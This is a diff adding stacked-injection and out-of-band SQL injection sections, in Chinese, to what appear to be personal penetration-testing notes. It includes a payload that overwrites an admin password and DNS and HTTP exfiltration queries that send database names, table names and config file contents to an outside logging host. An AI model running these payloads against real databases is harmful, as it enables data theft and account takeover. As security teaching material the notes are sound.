@@ -238,6 +238,27 @@ sqlmap -r "post.txt" --os-shell
 ```
 ---
 
+## Stacked
+
+堆叠注入（Stacked Injections）堆叠注入则允许攻击者在原本的查询语句后面，通过分号`;`结束当前语句，然后**额外追加一条或多条全新的 SQL 语句**。
+
+```php
+$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+```
+*修改为*
+```php
+mysqli_multi_query($GLOBALS["___mysqli_ston"],  $query);
+$result = mysqli_use_result($GLOBALS["___mysqli_ston"]);
+```
+
+**payload**
+
+```sql
+1'; update users set password='e10adc3949ba59abbe56e057f20f883e' where user_id=1; -- 
+```
+
+---
+
 ## In-Band
 
 [In-Band SQLi](../security/webpentesting.md#in-band-sqli)
@@ -430,3 +451,113 @@ for j in range(1, num+1):
             break
 print("name of database is ", ''.join(l))
 ```
+---
+
+## OOB
+
+[Out-of-Band SQLi](../security/webpentesting.md#out-of-band-sqli)
+
+![OOB](assets/OOB.png)
+
+OOB 注入（Out-of-Band Injection，带外注入）可以让目标服务器自己化身为“内鬼”，主动通过另外一个独立的网络通道（比如 DNS 或 HTTP），把数据送到攻击者的服务器上。
+
+带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。
+
+**一次OOB攻击能够成功是基于：**
+
+1. 存在漏洞的系统；
+2. 外围防火墙的出站请求。
+
+### DNS迭代查询
+
+[DNS协议](../web/HTTPProtocol#dns)
+
+- 域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。
+- DNS使用TCP和UDP端口**53**。
+- 当前，对于每一级域名长度的限制是**63**个字符，域名总长度则不能超过**253**个字符。
+
+<span style="font-size: 19px;">**DNS迭代查询原理**</span>
+
+1. 首先有一个可以配置的域名test.com。
+2. 通过代理商设置域名test.com的nameserver为自己拥有的服务器（S）的IP。
+3. 然后在S上搭建DNSServer。
+4. 这样test.com及其所有子域名的查询都会推送到S上，同时S也能够实时的监控针对test.com的查询请求。
+
+<span style="font-size: 19px;">**泛域名解析**</span>
+
+泛域名解析就是利用**通配符**的方式将所有的次级域名指向同一IP。
+
+`*.example.com` IP ： `www.example.com` 和 `abc.example.com` 都会访问到同一个站点。
+
+### tcpdump
+
+[tcpdump](../security/tcpdump.md)
+
+基于Unix系统的命令行的数据报嗅探工具，可以抓取流动在网卡上的数据包。
+
+**原理：**
+
+Linux抓包是通过注册一种虚拟的底层网络协议来完成对网络报文（准确的是网络设备）消息的处理权。
+
+系统在收到报文的时候就会给这个伪协议一次机会，让它对网卡收到的报文进行一次处理，此时该模块就会趁机对报文进行窥探。
+
+*监听DNS信息*
+```bash
+tcpdump–n port 53
+```
+
+### 实施带外注入
+
+带外注入可以简化盲注的过程，可以直接将查询到的结果通过DNS记录显示出来。
+
+[通过MySQL读写文件](../cyber/WebApplication.md#通过mysql读写文件)
+
+**payload**
+
+```sql
+select load_file(concat("\\\\",(select database()), ".7as54b.ceye.io\\abc"));
+```
+*获取数据库名*
+```sql
+?id=1' and load_file(concat("\\\\",(select database()), ".7as54b.ceye.io\\abc"))--+
+```
+*获取表名*
+```sql
+?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables
+where table_schema='test' limit 0,1),".7as54b.ceye.io\\abc")) --+
+```
+<span style="font-size: 19px;">**大文本传输**</span>
+
+- `substr` 对文件内容进行切片
+- `to_base64` 对切片的内容进行编码
+- `concat` 将编码后的内容与域名进行拼接
+- `load_file` 访问该[UNC](../common.md#unc)路径
+
+```sql
+select concat(to_base64(substr(load_file("C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\my.ini"),1,15)),".example.com") as result;
+```
+<span style="font-size: 19px;">**HTTP带外注入**</span>
+
+**UTL_HTTP.request**
+
+**Oracle** 发起HTTP请求 **UTL_HTTP.REQUEST ( url IN VARCHAR2, proxy IN VARCHAR2 DEFAULT NULL);**
+- url：目标服务器地址
+- porxy：代理服务器地址，该参数为可选参数
+
+它的返回类型是长度为2000或更短的字符串，它包含从HTTP请求返回到参数URL的HTML结果的前2000个字节。
+
+<img src="./assets/HTTP_OOB.png" alt="background" width="533" >
+
+*通过SQL注入让目标服务器执行*
+```sql
+select UTL_HTTP.request('http://192.168.25.166/test.php'||'?id='||(select version from v$instance)) from dual;
+```
+在`192.168.25.166` 上的 test.php 会记录传递来的数据，并写入test.txt文件中。
+
+---
+
+## 混淆和绕过
+
+[Filter Evasion Techniques](../webapp/InjectionAttacks.md#filter-evasion-techniques)
+
+普通的注入方式过于明显，很容易被检测。因此，需要改变攻击的手法，绕过检测和过滤，即**混淆和绕过**。具体操作针对于服务端和WAF的防御机制有多种手段。
